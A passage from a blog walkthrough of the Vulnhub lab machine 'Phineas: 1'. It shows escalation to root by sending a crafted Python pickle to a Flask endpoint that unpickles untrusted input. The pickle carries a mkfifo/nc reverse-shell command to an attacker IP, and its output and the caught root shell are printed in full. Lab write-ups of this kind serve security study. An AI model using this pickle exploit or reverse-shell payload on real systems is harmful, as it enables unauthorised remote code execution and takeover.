uid=1001(anna) gid=1001(anna) groups=1001(anna) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
Phineas
[anna@phineas ~]$ cd Desktop/
[anna@phineas Desktop]$ ls -la
total 8
drwx------.  2 anna anna   22 Mar 31 05:34 .
drwx------. 19 anna anna 4096 Apr 27 12:52 ..
-rwx------.  1 anna anna   35 Mar 31 05:21 user.txt
[anna@phineas Desktop]$ cat user.txt 
c2Vpc2VtcHJlbmVsbWlvY3VvcmVtYW1tYQ
</span></pre></table></code></div></div><p>And we are anna!</p><h2 id="shell-as-root">Shell as Root</h2><p>After running linpeas we can see that there are 2 ports running locally on port 631 and 5000.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="o">[</span>+] Iptables rules
iptables rules Not Found

<span class="o">[</span>+] Active Ports
<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:111             0.0.0.0:<span class="k">*</span>               LISTEN      -                    
tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -                    
tcp        0      0 127.0.0.1:631           0.0.0.0:<span class="k">*</span>               LISTEN      -                    
tcp        0      0 127.0.0.1:5000          0.0.0.0:<span class="k">*</span>               LISTEN      -                    
tcp        0      0 0.0.0.0:3306            0.0.0.0:<span class="k">*</span>               LISTEN      -                    
tcp6       0      0 :::111                  :::<span class="k">*</span>                    LISTEN      -                    
tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN      -                    
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -                    
tcp6       0      0 ::1:631                 :::<span class="k">*</span>                    LISTEN      -    
</pre></table></code></div></div><p>Also running pspy64:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="o">[</span>anna@phineas 192.168.1.152]<span class="nv">$ </span>./pspy64 <span class="nt">-pf</span> <span class="nt">-i</span> 1000                                                                                                                        
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855                                                                                             
                                                                                                                                                                          
                                                                                                                                                                          
     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                                                                   
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                                                                   
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                                                                   
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                                                                                   
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                                                                   
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                                                                    
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                                                                    
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                                                                     
                   ░           ░ ░                                                                                                                                        
                               ░ ░                                                                                                                                        
                                                                                                                                                                          
Config: Printing events <span class="o">(</span><span class="nv">colored</span><span class="o">=</span><span class="nb">true</span><span class="o">)</span>: <span class="nv">processes</span><span class="o">=</span><span class="nb">true</span> | file-system-events<span class="o">=</span><span class="nb">true</span> <span class="o">||</span>| Scannning <span class="k">for </span>processes every 1s and on inotify events <span class="o">||</span>| Watching directories: <span class="o">[</span>/us
r /tmp /etc /home /var /opt] <span class="o">(</span>recursive<span class="o">)</span> | <span class="o">[]</span> <span class="o">(</span>non-recursive<span class="o">)</span>                                                                                                             
Draining file system events due to startup...                                                                                                                             
<span class="k">done                                                                                                                                                                      
</span>2021/04/30 12:54:19 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>998    | /usr/sbin/httpd <span class="nt">-DFOREGROUND</span>                                                                                               
2021/04/30 12:54:19 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>990    | /usr/bin/python3 /usr/local/bin/flask run                                                                                  
2021/04/30 12:54:19 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>989    | /usr/sbin/rsyslogd <span class="nt">-n</span>                                                                                                      
2021/04/30 12:54:19 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>985    | /usr/sbin/sshd <span class="nt">-D</span>                                                                                                          
2021/04/30 12:54:19 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>984    | /bin/bash /root/run_flask.sh  
</pre></table></code></div></div><p>We can see that there is a flask service running on the system. This is highly suspicious since in anna home folder, after further enumeration we can find the below.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="o">[</span>anna@phineas web]<span class="nv">$ </span><span class="nb">cat </span>app.py
<span class="c">#!/usr/bin/python3</span>

import pickle
import <span class="nb">base64
</span>from flask import Flask, request

app <span class="o">=</span> Flask<span class="o">(</span>__name__<span class="o">)</span>


@app.route<span class="o">(</span><span class="s2">"/heaven"</span>, <span class="nv">methods</span><span class="o">=[</span><span class="s2">"POST"</span><span class="o">])</span>
def heaven<span class="o">()</span>:
    data <span class="o">=</span> base64.urlsafe_b64decode<span class="o">(</span>request.form[<span class="s1">'awesome'</span><span class="o">])</span>
    pickle.loads<span class="o">(</span>data<span class="o">)</span>
    <span class="k">return</span> <span class="s1">''</span>, 204
</pre></table></code></div></div><p>The scripts shows that at <em>/heaven</em>, there is a <em>POST</em> route that takes form data <em>awesome</em>. The data comes encoded in base64 (for transfer), is decoded and then unpickled.</p><p>Combining this together, we can deduce that the server is hosting a python flask on port 5000 and we are to exploit python pickle to escalate to root.</p><p>How do we know if pickle not secure? Based on its documentation page:</p><blockquote><p>Warning The <code class="language-plaintext highlighter-rouge">pickle</code> module <strong>is not secure</strong>. Only unpickle data you trust. It is possible to construct malicious pickle data which will <strong>execute arbitrary code during unpickling</strong>. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.</p></blockquote><p>Thus, to execute the exploit we cannot simply send a request within the phineas system, we have to create a local port forwarding so we are able to send a request from our system to phineas to port 5000.</p><p>First, we set a ssh local port forwarding</p><p>Syntax :</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>e.g. ssh remotehost -L 123:localhost:456
123 — port 123 on our machine to receive the forwarded port from the remote host
localhost — The forward to host. In this particular case it’s the victim machine
456 — port 456 on the target machine (victim) to be forwarded to the remote host
remotehost — system we want to SSH into and forward ports from.

If server is running a website on port 8080 but you can only access it internally from the target’s network. Using an arbitrary port like 9000 on our Kali system we can use this to access the website.
The command to do this would be: ssh -L 9000:localhost:8080 victim
Once the tunnel has been established you can access this new website via http://localhost:9000
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>└─# ssh anna@192.168.1.29 <span class="nt">-L</span> 5000:localhost:5000   
anna@192.168.1.29<span class="s1">'s password: 
Last login: Fri Apr 30 13:03:53 2021 from kali
[anna@phineas ~]$ 
</span></pre></table></code></div></div><p>Once the tunnel has been established we can access this new website at http://localhost:5000</p><p>Now to create the exploit</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[/opt/HTB/Phineas]
└─# <span class="nb">cat </span>exp.py         
import pickle
import <span class="nb">base64
</span>import os


class RCE:
    def __reduce__<span class="o">(</span>self<span class="o">)</span>:
        cmd <span class="o">=</span> <span class="o">(</span><span class="s1">'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '</span>
               <span class="s1">'/bin/sh -i 2&gt;&amp;1 | nc 192.168.1.152 1234 &gt; /tmp/f'</span><span class="o">)</span>
        <span class="k">return </span>os.system, <span class="o">(</span>cmd,<span class="o">)</span>


<span class="k">if </span>__name__ <span class="o">==</span> <span class="s1">'__main__'</span>:
    pickled <span class="o">=</span> pickle.dumps<span class="o">(</span>RCE<span class="o">())</span>
    print<span class="o">(</span>base64.urlsafe_b64encode<span class="o">(</span>pickled<span class="o">))</span>
                                                                                                                                                                          
┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[/opt/HTB/Phineas]
└─# python3 exp.py                  
b<span class="s1">'gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI-JjEgfCBuYyAxOTIuMTY4LjEuMTUyIDEyMzQgPiAvdG1wL2aUhZRSlC4='</span>

</pre></table></code></div></div><p>Sending the payload:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[/opt]
└─# curl <span class="nt">-X</span> <span class="s2">"POST"</span> <span class="nt">-d</span> <span class="s2">"b'gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI-JjEgfCBuYyAxOTIuMTY4LjEuMTUyIDEyMzQgPiAvdG1wL2aUhZRSlC4='"</span> http://127.0.0.1:5000/heaven  
</pre></table></code></div></div><p>Catching the shell:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre>└─# nc <span class="nt">-lvnp</span> 1234                                                                                                                                                  
listening on <span class="o">[</span>any] 1234 ...                                                                                                                                               
connect to <span class="o">[</span>192.168.1.152] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.1.29] 42030                                                                                                            
sh: no job control <span class="k">in </span>this shell                                                                                                                                          
sh-4.2# <span class="nb">whoami                                                                                                                                                            
whoami                                                                                                                                                                    
</span>root                                                                                                                                                                      
sh-4.2# <span class="nb">pwd                                                                                                                                                               
pwd</span>                                                                                                                                                                       
/home/anna/web
sh-4.2# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
sh-4.2# <span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 40
drw-------.  7 root root  265 Apr  1 05:17 <span class="nb">.</span>
dr-xr-xr-x. 17 root root  224 Nov 23 12:26 ..
<span class="nt">-rw-------</span><span class="nb">.</span>  1 root root 1920 Nov 23 12:27 anaconda-ks.cfg
<span class="nt">-rw-------</span><span class="nb">.</span>  1 root root  107 Apr  1 13:56 .bash_history
<span class="nt">-rw-r--r--</span><span class="nb">.</span>  1 root root   18 Dec 28  2013 .bash_logout
<span class="nt">-rw-r--r--</span><span class="nb">.</span>  1 root root  176 Dec 28  2013 .bash_profile
<span class="nt">-rw-r--r--</span><span class="nb">.</span>  1 root root  176 Dec 28  2013 .bashrc
drwx------.  5 root root   42 Mar 31 04:01 .cache
drwx------.  4 root root   30 Mar 31 03:52 .config
<span class="nt">-rw-r--r--</span><span class="nb">.</span>  1 root root  100 Dec 28  2013 .cshrc
drwx------.  3 root root   25 Nov 23 12:28 .dbus
drwxr-xr-x.  4 root root   31 Apr  1 05:17 .gem
<span class="nt">-rw-------</span><span class="nb">.</span>  1 root root 1948 Nov 23 12:29 initial-setup-ks.cfg
drwxr-----.  3 root root   19 Mar 31 03:58 .pki
<span class="nt">-rw-------</span><span class="nb">.</span>  1 root root   32 Mar 31 05:22 root.txt
<span class="nt">-rwx--x--x</span><span class="nb">.</span>  1 root root   43 Mar 31 05:26 run_flask.sh
<span class="nt">-rw-r--r--</span><span class="nb">.</span>  1 root root  129 Dec 28  2013 .tcshrc
sh-4.2# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt
YW5uYW1hcmlhbmljb3NhbnRpdml2ZSE
sh-4.2# <span class="nb">whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
</span>root
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:unconfined_service_t:s0
phineas
</pre></table></code></div></div><p>Rooted!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vulnhub/'>Vulnhub</a>, <a href='/categories/medium/'>medium</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/python-pickles/" class="post-tag no-text-decoration" >Python pickles</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=PHINEAS: 1 - am-a-circle&url=https://am-a-circle.github.io//posts/PHINEAS_1/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=PHINEAS: 1 - am-a-circle&u=https://am-a-circle.github.io//posts/PHINEAS_1/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=PHINEAS: 1 - am-a-circle&url=https://am-a-circle.github.io//posts/PHINEAS_1/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CarPT-Part1/">Automobile Hacking - Part 1</a><li><a href="/posts/CarPT-Part2/">Automobile Hacking - Part 2</a><li><a href="/posts/CRTP/">Attacking and Defending Active Directory Lab Course</a><li><a href="/posts/goals/">Goals</a><li><a href="/posts/speed/">Speed</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/path-variable/">Path Variable</a> <a class="post-tag" href="/tags/base64/">base64</a> <a class="post-tag" href="/tags/cp/">cp</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/disk-group/">Disk Group</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/docker-escape/">Docker Escape</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/PYEXP_1/"><div class="card-body"> <span class="timeago small" >Apr 18, 2021<i class="unloaded">2021-04-18T12:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PYEXP 1</h3><div class="text-muted small"><p> Overview “PYEXP: 1” is an interesting box as it teaches the concept of brute-forcing,database enumeration and exploiting dangerous python function. Box Difficulty Link ...</p></div></div></a></div><div class="card"> <a href="/posts/PYLINGTON_1/"><div class="card-body"> <span class="timeago small" >Apr 25, 2021<i class="unloaded">2021-04-25T20:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PYLINGTON 1</h3><div class="text-muted small"><p> Overview “PYLINGTON: 1” was quite a unique box as it really it good for you to think out of the box for ways to exploit the system. Box Difficulty Link ...</p></div></div></a></div><div class="card"> <a href="/posts/ONSYSTEM-HANNAH/"><div class="card-body"> <span class="timeago small" >Apr 15, 2021<i class="unloaded">2021-04-15T12:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OnSystem ShellDredd</h3><div class="text-muted small"><p> Overview “ONSYSTEM: SHELLDREDD #1 HANNAH” is an easy boxes which is great for beginners to learn more about enumerating the poorly configured FTP port to search for sensitive information and escal...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/PYLINGTON_1/" class="btn btn-outline-primary" prompt="Older"><p>PYLINGTON 1</p></a> <a href="/posts/Hacksudo_Search/" class="btn btn-outline-primary" prompt="Newer"><p>Hacksudo: search</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/am-a-circle">am-a-circle</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/path-variable/">Path Variable</a> <a class="post-tag" href="/tags/base64/">base64</a> <a class="post-tag" href="/tags/cp/">cp</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/disk-group/">Disk Group</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/docker-escape/">Docker Escape</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
